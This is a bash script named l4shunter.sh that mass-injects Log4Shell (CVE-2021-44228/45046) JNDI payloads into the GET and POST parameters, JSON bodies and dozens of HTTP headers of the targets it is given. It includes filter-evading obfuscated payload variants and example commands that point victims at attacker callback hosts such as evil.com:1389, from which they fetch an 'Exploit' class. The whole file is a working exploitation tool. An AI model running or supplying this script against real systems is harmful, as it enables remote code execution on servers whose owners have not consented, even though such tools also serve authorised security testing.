#!/bin/bash
# To hunt for machines vulnerable to CVE-2021-44228 or CVE-2021-45046
# Complete curl command is similar to curl 'http://10.10.119.219:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit\}'

print_usage() {
  	echo -e "${R}USAGE:${STOP}";
  	echo -e "${O}./l4shunter.sh < -c callbackHost> < -T target1[,2,...]> < -P payloadClass> [-j jndiCustomPayload] [-H header1[,2,...]] [-t timeout] [-p protocol1[,2,...]] [-U urlsFileName] [-e \"extraCurlParameters\"] [-G getParam1[,2,...]] [-d postParam1[,2,...]] [-X method1[,2,...]] [-n] [-h]${STOP}";
	echo -e "${O}-c | --callback-host${STOP} set the ldap/rmi/dns server that will catch the request";
	echo -e "${O}-T | --targets${STOP} set the targeted IPs/hostnames, separated by commas";
	echo -e "${O}-P | --payload-class${STOP} set the part after the callback host (generally the java class to download)";
	echo -e "${O}-j | --jndi${STOP} (opt) set a custom jndi payload";
	echo -e "${O}-H | --headers${STOP} (opt) set a headers' list to test, separated by commas";
	echo -e "${O}-t | --timeout${STOP} (opt) set the time between each request, in seconds (default 3)";
	echo -e "${O}-p | --protocols${STOP} (opt) set a list of protocols to test, they also can have custom payloads, separated by commas";
	echo -e "${O}-U | --urls-file${STOP} (opt) set a list of folders/files to test (eg if target is localhost:8080 and the file contains 'user/login' and 'admin', the requests will be localhost:8080/user/login and localhost:8080/admin)";
	echo -e "${O}-e | --extra-params${STOP} (opt) set a list of extra parameters to pass to curl, cf examples. The list is built by detecting parameters (strings that begins by '-'), ${R}DO NOT USE QUOTES${STOP}";
	echo -e "${O}-G | --get-params${STOP} (opt) set a list of GET parameters to test, separated by commas";
	echo -e "${O}-d | --post-params${STOP} (opt) set a list of POST parameters to test, separated by commas";
	echo -e "${O}-X | --methods${STOP} (opt) set a list of methods to test, default value is 'GET,POST,POSTJSON'";
	echo -e "${O}-n | --no-banner${STOP} (opt) skip banner display";
	echo -e "${O}-h | --help${STOP} (opt) display this help";
	
  	echo -e "\n${R}EXAMPLES:${STOP}";
	echo -e "One target with login form accepting json";
	echo -e "${O}./l4shunter.sh -c localhost:1389 -T localhost:8081/login -P Exploit -X POSTJSON ${STOP}";
	echo -e "One target with a list of urls, custom jndi and protocol payloads, and a JSESSIONID, testing all possible headers (cf \$allHeaders)";
	echo -e "${O}./l4shunter.sh -c localhost:1389 -T localhost:8081 -j \\\${lower:j}n\\\${lower:d}i -p r\\\${::-m}\\\${::-i} -P Exploit -U urlsFile.txt -H ALL -e \"-H Cookie: JSESSIONID=secret\" ${STOP}";
	echo -e "One target with log4j 2.15 (CVE-2021-45046), testing 2 headers and one GET parameter, showing headers of request and response";
	echo -e "${O}./l4shunter.sh -c 127.0.0.1#evil.com:1389 -T localhost:8089/get -P Exploit -H X-Api-Version,Referer -G getParam -e \"-i -v\" ${STOP}";
	echo -e "Showing only requests and final payload (hiding everything from curl)";
	echo -e "${O}./l4shunter.sh -c evil.com:1389 -T localhost:8089/get -P Exploit -H X-Api-Version,Referer -e \"-s -o /dev/null\" ${STOP}";
	exit;
}

print_banner() {
	echo -e "${P}       |       ______                         _______ ______ ______${STOP}";
	echo -e "${P}|      |    \  |      |     | |     | |\    | |  |  | |      |    |${STOP}";
	echo -e "${P}|      |_____\ |_____ |_____| |     | | \_  |    |    |__    |____|${STOP}";
	echo -e "${P}|      |            | |     | |     | |   \ |    |    |      |   \ ${STOP}";
	echo -e "${P}|_____ |       _____| |     | |_____| |    \|    |    |_____ |    |${STOP}\n\n";
}

# https://stackoverflow.com/questions/2129923/how-to-run-a-command-before-a-bash-script-exits
function cleanup {
  rm "$tmpJsonFile" 2>/dev/null;
}

setDefaultValues() {
	rawTargets='';
	callbackHost=''
	rawProtocols='${::-r}m${::-i}'; # eg ldap,ldaps,rmi,dns,iiop,http
	rawGetParams='';
	rawPostParams='username,user,email,email_address,password';
	rawHeaders=''; # by default, we don't test any headers
	allHeaders='Referer,X-Api-Version,Accept-Charset,Accept-Datetime,Accept-Encoding,Accept-Language,Cookie,Forwarded,Forwarded-For,Forwarded-For-Ip,Forwarded-Proto,From,TE,True-Client-IP,Upgrade,User-Agent,Via,Warning,X-Api-Version,Max-Forwards,Origin,Pragma,DNT,Cache-Control,X-Att-Deviceid,X-ATT-DeviceId,X-Correlation-ID,X-Csrf-Token,X-CSRFToken,X-Do-Not-Track,X-Foo,X-Foo-Bar,X-Forwarded,X-Forwarded-By,X-Forwarded-For,X-Forwarded-For-Original,X-Forwarded-Host,X-Forwarded-Port,X-Forwarded-Proto,X-Forwarded-Protocol,X-Forwarded-Scheme,X-Forwarded-Server,X-Forwarded-Ssl,X-Forwarder-For,X-Forward-For,X-Forward-Proto,X-Frame-Options,X-From,X-Geoip-Country,X-Http-Destinationurl,X-Http-Host-Override,X-Http-Method,X-Http-Method-Override,X-HTTP-Method-Override,X-Http-Path-Override,X-Https,X-Htx-Agent,X-Hub-Signature,X-If-Unmodified-Since,X-Imbo-Test-Config,X-Insight,X-Ip,X-Ip-Trail,X-ProxyUser-Ip,X-Requested-With,X-Request-ID,X-UIDH,X-Wap-Profile,X-XSRF-TOKEN' # if -H ALL is passed, all those headers will be tested simultaneously
	rawMethods='GET,POST,POSTJSON';
	rawExtraParams=''
	urlsFile=''
	payload=''
	timeout='3';
	jndi='${::-j}n${::-d}${::-i}';
	noBanner="false" # print hack3r banner by default for consistency
}

setVariablesFromParameters() {

	# Note the quotes around '$TEMP': they are essential!
	eval set -- "$TEMP"
	
	while true; do
	  case "$1" in
		-c | --callback-host ) callbackHost="$2"; shift 2;;
		-j | --jndi ) jndi="$2"; shift 2;;
		-H | --headers ) rawHeaders="$2"; shift 2;;
		-T | --targets ) rawTargets="$2"; shift 2;;
		-t | --timeout ) timeout="$2"; shift 2;;
		-p | --protocols ) rawProtocols="$2"; shift 2;;
		-P | --payload ) payload="$2"; shift 2;;
		-U | --urls-file ) urlsFile="$2"; shift 2;;
		-e | --extra-params ) rawExtraParams="$2"; shift 2;;
		-G | --get-params ) rawGetParams="$2"; shift 2;;
		-d | --post-params ) rawPostParams="$2"; shift 2;;
		-X | --methods ) rawMethods="$2"; shift 2;;
		-n | --no-banner ) noBanner="true"; shift;;
		-h | --help ) print_usage; exit;;
		-F | --night-fever ) nightFever="true"; shift;;
		-- ) shift; break ;;
		* ) break ;;
	  esac
	done
	
	Y='\033[1;33m';
	O='\033[1;36m';
	P='\033[1;35m';
	G='\033[1;32m';
	R='\033[0;31m';
	STOP='\033[0m';
	
	if [[ $nightFever = "true" ]]; then
		NF='\033[1;5m'; Y+="$NF"; O+="$NF"; P+="$NF"; G+="$NF"; R+="$NF";
	fi

	if [[ "$noBanner" = "false" ]]; then
		print_banner
	fi

	if [[ -z "$callbackHost" ]] || [[ -z "$rawTargets" ]] || [[ -z "$payload" ]]; then
		print_usage;
	fi
}

processExtraParams() {
	# https://stackoverflow.com/questions/10586153/how-to-split-a-string-into-an-array-in-bash
	extraParams=( $rawExtraParams );
	lastCommandIndex=0
	processedExtraParams=(  );
	for(( i=0; i<$((${#extraParams[@]})); i++ )); do # instead of using an extra variable to store the length of an array, you can use ${#array[@]}
		if [[ ${extraParams[$i]} == -* ]] || [[ ${extraParams[$i]} == --* ]]; then
			processedExtraParams+=(${extraParams[$i]}) # NO QUOTES so the added value is eg -H and not '-H'
			lastCommandIndex=$i;
		else
			if [[ $lastCommandIndex == $(($i-1)) ]]; then
				processedExtraParams+=("${extraParams[$i]}")
			else
				processedExtraParams[-1]="${processedExtraParams[-1]} ${extraParams[$i]}"
			fi
		fi
	done
}

setSharedVariables() {
	# https://stackoverflow.com/questions/918886/how-do-i-split-a-string-on-a-delimiter-in-bash
	targets=(${rawTargets//,/ }); # replace the "," by a " ", then it's like a classical array in bash NO DOUBLE QUOTES
	protocols=(${rawProtocols//,/ }); # adding declare -a to an array in a function will make them local scope. To use global variables in functions just use nothing else than the name
	
	getParams=(${rawGetParams//,/ });

	postParams=( )
	if [[ -z "$rawPostParams" ]]; then
		postParams=("${defaultPostParams[@]}")
	else
		postParams=(${rawPostParams//,/ });
	fi

	methods=(${rawMethods//,/ });

	headers=( )
	echo "$rawHeaders";
	if [[ -z "$rawHeaders" ]]; then
		headers=( )
	elif [[ "${rawHeaders[0]}" == "ALL" ]]; then	
		headers=(${allHeaders//,/ })
	else
		headers=(${rawHeaders//,/ });
	fi

	if [[ -e $urlsFile ]]; then
		readarray -t urls < "$urlsFile" 2>/dev/null;
	fi

	# Add backslash to curly brackets for our friend curl
	callbackHost=$(echo "$callbackHost" | sed 's/[{]/\\{/g' | sed 's/[}]/\\}/g');
	jndiGet=$(echo "$jndi" | sed 's/[{]/\\{/g' | sed 's/[}]/\\}/g');
}


# https://stackoverflow.com/questions/23564995/how-to-modify-a-global-variable-within-a-function-in-bash
processGetParams() {
	protocolGet=$(echo "$pr" | sed 's/[{]/\\{/g' | sed 's/[}]/\\}/g');
	for(( i=0; i<${#getParams[@]}; i++ )); do 
		if [[ "$i" -eq "0" ]] && [[ "$target" != *"?"* ]]; then
			processedGetParams="?${getParams[$i]}=\$\{$jndiGet:$protocolGet://$callbackHost/$payload\}";
		else
			processedGetParams+="&${getParams[$i]}=\$\{$jndiGet:$protocolGet://$callbackHost/$payload\}";
		fi
	done
	echo "$processedGetParams";
}

processPostParams() {
	for(( i=0; i<${#postParams[@]}; i++ )); do 
		if [[ "$i" -eq "0" ]] && [[ "$target" != *"?"* ]]; then
			processedPostParams="${postParams[$i]}=\${$jndi:$pr://$callbackHost/$payload}";
		else
			processedPostParams+="&${postParams[$i]}=\${$jndi:$pr://$callbackHost/$payload}";
		fi
	done
	echo "$processedPostParams";
}

# https://stackoverflow.com/questions/29047183/define-a-local-array-in-a-bash-function-and-access-it-outside-that-function
processHeaders() {
	processedHeaders=()
	for header in "${headers[@]}"; do
		processedHeaders+=(-H);
		processedHeaders+=("$header: \${$jndi:$pr://$callbackHost/$payload}");
	done
}

createPostJsonFile() {
	echo '{' > "$tmpJsonFile"
	for(( i=0; i<${#postParams[@]}; i++ )); do 
		if [[ "$i" -ne "$((${#postParams[@]}-1))" ]]; then
			echo "\"${postParams[$i]}\": \"\${$jndi:$pr://$callbackHost/$payload}\"," >> "$tmpJsonFile"; 
		else
			echo "\"${postParams[$i]}\": \"\${$jndi:$pr://$callbackHost/$payload}\"" >> "$tmpJsonFile"; 
		fi
	done
	echo '}' >> "$tmpJsonFile"
}



# ----- MAIN -----
trap cleanup EXIT
tmpJsonFile="l4shunter_tmp_.json";
setDefaultValues

# https://stackoverflow.com/questions/402377/using-getopts-to-process-long-and-short-command-line-options
TEMP=$(getopt -o c:j:H:T:t:p:P:U:e:G:d:X:nhF --long callback-host:,jndi:,headers:,targets:,timeout:,protocols:,payload-class:,urls:,extra-params:,get-params:,post-params:,no-banner,night-fever,methods:,help,u \
			 -n 'l4shunter' -- "$@")

if [ $? != 0 ] ; then print_usage >&2 ; exit 1 ; fi

setVariablesFromParameters
processExtraParams
# those variables will not be modified between each request
setSharedVariables

# Go through targets and protocols and send requests
for target in "${targets[@]}" ; do
		for pr in "${protocols[@]}"; do
			for method in "${methods[@]}" ; do
				# Set get and post parameters, and headers
				processedGetParams="$(processGetParams)";
				processedPostParams="$(processPostParams)";
				processHeaders
				echo -e "${Y}$method${STOP} ${G}$target$processedGetParams${STOP} ${O}$jndi:$pr://$callbackHost/$payload${STOP}";
				
				# SEND REQUESTS (this part may be improved)
				# POST
				if [[ $method == "POST" ]]; then
					if [[ -z $urls ]]; then
						 curl "$target$processedGetParams" "${processedHeaders[@]}" "-d${processedPostParams[@]}" "${processedExtraParams[@]}";
					else
						for url in "${urls[@]}"; do
							curl "$target/$url$processedGetParams" "${processedHeaders[@]}" "-d${processedPostParams[@]}" "${processedExtraParams[@]}";
						done
					fi
				# POSTJSON
				elif [[ $method == "POSTJSON" ]]; then
					# Create jsonFile for POSTJSON
					createPostJsonFile
					# POSTJSON request
					if [[ -z $urls ]]; then
						 curl "$target$processedGetParams" "${processedHeaders[@]}" -H "Content-Type: application/json" --data-binary "@$tmpJsonFile" "${processedExtraParams[@]}";
					else
						for url in "${urls[@]}"; do
							curl "$target/$url$processedGetParams" "${processedHeaders[@]}" -H "Content-Type: application/json" --data-binary "@$tmpJsonFile" "${processedExtraParams[@]}";
						done
					fi
				# GET
				else
					if [[ -z $urls ]]; then
						 curl -X "$method" "$target$processedGetParams" "${processedHeaders[@]}" "${processedExtraParams[@]}";
					else
						for url in "${urls[@]}"; do
							curl -X "$method" "$target/$url$processedGetParams" "${processedHeaders[@]}" "${processedExtraParams[@]}";
						done
					fi
				fi;

				sleep "$timeout";
				done;
		done;
done;

cleanup
